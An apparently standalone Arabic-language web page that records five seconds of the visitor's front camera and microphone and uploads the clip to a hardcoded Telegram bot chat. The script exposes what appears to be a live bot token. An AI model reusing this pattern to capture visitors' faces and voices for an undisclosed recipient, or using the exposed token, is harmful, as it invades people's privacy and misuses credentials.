<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إرسال فيديو إلى Telegram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f0f0f0;
        }
        #recordBtn {
            background-color: #28a745;
            color: white;
            border: none;
            padding: 20px;
            font-size: 20px;
            border-radius: 10px;
            cursor: pointer;
            margin: 20px 0;
            width: 100%;
            max-width: 300px;
        }
        #timer {
            font-size: 24px;
            margin: 10px 0;
            display: none;
        }
        #status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 5px;
            display: none;
        }
        .success { background-color: #d4edda; color: #155724; }
        .error { background-color: #f8d7da; color: #721c24; }
        .recording { background-color: #dc3545; }
    </style>
</head>
<body>
    <button id="recordBtn">تسجيل فيديو (5 ثواني)</button>
    <div id="timer" style="display: none;">5</div>
    <div id="status"></div>

    <script>
        const botToken = '8316015659:AAFaKjIiQ5u8nPUFToCykLMKcQfZFqPjzKo';
        const chatId = '8096601840';
        let mediaRecorder;
        let recordedChunks = [];
        let countdown;

        document.getElementById('recordBtn').addEventListener('click', async function() {
            const recordBtn = document.getElementById('recordBtn');
            const timer = document.getElementById('timer');
            
            try {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    // إذا كان التسجيل جارياً، توقف
                    mediaRecorder.stop();
                    return;
                }
                
                // بدء التسجيل
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' },
                    audio: true // إضافة الصوت إذا needed
                });
                
                mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'video/webm;codecs=vp9',
                    videoBitsPerSecond: 3000000
                });
                
                recordedChunks = [];
                
                mediaRecorder.ondataavailable = function(e) {
                    if (e.data.size > 0) {
                        recordedChunks.push(e.data);
                    }
                };
                
                mediaRecorder.onstop = async function() {
                    // إيقاف العد التنازلي
                    clearInterval(countdown);
                    timer.style.display = 'none';
                    recordBtn.textContent = 'تسجيل فيديو (5 ثواني)';
                    recordBtn.style.backgroundColor = '#28a745';
                    
                    // إرسال الفيديو
                    await sendVideoToTelegram();
                    
                    // إيقاف الكاميرا
                    stream.getTracks().forEach(track => track.stop());
                };
                
                // بدء التسجيل
                mediaRecorder.start();
                recordBtn.textContent = 'إيقاف التسجيل';
                recordBtn.style.backgroundColor = '#dc3545';
                
                // بدء العد التنازلي
                let seconds = 5;
                timer.textContent = seconds;
                timer.style.display = 'block';
                
                countdown = setInterval(() => {
                    seconds--;
                    timer.textContent = seconds;
                    
                    if (seconds <= 0) {
                        clearInterval(countdown);
                        mediaRecorder.stop();
                    }
                }, 1000);
                
            } catch (error) {
                showStatus('حدث خطأ: ' + error.message, 'error');
            }
        });
        
        async function sendVideoToTelegram() {
            showStatus('جاري إرسال الفيديو...', 'success');
            
            try {
                // دمج القطع المسجلة في فيديو واحد
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                
                // تحويل webm إلى mp4 إذا needed (هذا مثال مبسط)
                // في المتصفحات الحديثة، يمكن إرسال webm مباشرة
                
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('video', blob, 'video.mp4');
                formData.append('caption', 'فيديو مسجل من الهاتف - 5 ثواني');
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    showStatus('تم إرسال الفيديو بنجاح!', 'success');
                } else {
                    showStatus('فشل في إرسال الفيديو: ' + JSON.stringify(data), 'error');
                }
            } catch (error) {
                showStatus('حدث خطأ: ' + error.message, 'error');
            }
        }
        
        function showStatus(message, type) {
            const statusElement = document.getElementById('status');
            statusElement.textContent = message;
            statusElement.className = type;
            statusElement.style.display = 'block';
            
            // إخفاء الرسالة بعد 5 ثواني
            setTimeout(() => {
                statusElement.style.display = 'none';
            }, 5000);
        }
    </script>
</body>
</html>
